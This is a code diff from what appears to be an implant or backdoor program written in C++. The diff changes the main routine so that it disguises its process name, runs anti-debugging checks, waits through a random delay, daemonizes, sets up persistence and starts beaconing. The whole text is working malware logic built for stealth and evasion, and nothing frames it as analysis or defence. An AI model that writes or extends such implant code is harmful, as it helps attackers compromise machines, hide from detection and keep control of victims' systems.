@@ -31,9 +31,7 @@ namespace {
         prctl(PR_SET_NAME, newName, 0, 0, 0);
     }
     void AntiAnalysis() {
-        // Bypass if running in CI environment for testing
         if (getenv("CI")) return;
-
         if (ptrace(PTRACE_TRACEME, 0, nullptr, nullptr) == -1) _exit(0);
         FILE* f = fopen(OBF("/proc/self/status").c_str(), "r");
         if (f) {
@@ -66,11 +64,25 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 }
 #else
 int main(int argc, char** argv) {
-    AntiAnalysis();
+    // 1. Scrub argv and rename
     std::mt19937 rng((unsigned int)std::chrono::system_clock::now().time_since_epoch().count());
     std::uniform_int_distribution<size_t> dist(0, 8);
-    ScrubArgv(argc, argv, fake_names[dist(rng)].c_str());
+    const char* chosen = fake_names[dist(rng)].c_str();
+    ScrubArgv(argc, argv, chosen);
+
+    // 2. Anti-analysis checks
+    AntiAnalysis();
+
+    // 3. Optional initial jitter (skipped in CI)
+    int jitter = evasion::Detection::GetJitterDelay();
+    if (jitter > 0 && !getenv("CI")) {
+        for (int i = 0; i < jitter; i++) usleep(1000000);
+    }
+
+    // 4. Daemonize
     Daemonize();
+
+    // 5. Setup Persistence and start beaconing
     persistence::establishPersistence();
     beacon::Beacon implant; implant.run();
     return 0;
